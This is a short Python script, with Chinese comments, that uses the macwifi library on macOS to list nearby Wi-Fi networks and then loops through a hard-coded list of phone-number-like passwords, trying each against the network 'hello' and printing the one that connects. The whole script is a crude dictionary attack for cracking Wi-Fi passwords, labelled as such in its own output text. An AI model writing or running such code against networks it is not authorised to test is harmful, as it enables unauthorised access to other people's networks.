import macwifi



def wifiname():
    ''' 返回wifi 列表'''
    # 获取wifi列表
    wf = macwifi.list()

    list = []
    # 初始化内容
    n = wf.split('\n')
    # print(n[1])
    nn = n[1].split()
    print(nn[0])

    for i in n[1:-1]:
        i = i.split()[0]
        list.append(i)
        # print(i)
    return list




if __name__ == '__main__':
    print(macwifi.name())
    # macwifi.turn_on()
    pwd = ['13506663281','1233333333','18005875656']
    i =1
    for _ in pwd:
        try:

            print(f'开始破解密码第{i}')
            macwifi.connect('hello',_)
            pass
        except:
            i=i+1
            print('密码不正确')
        else:
            print(_)



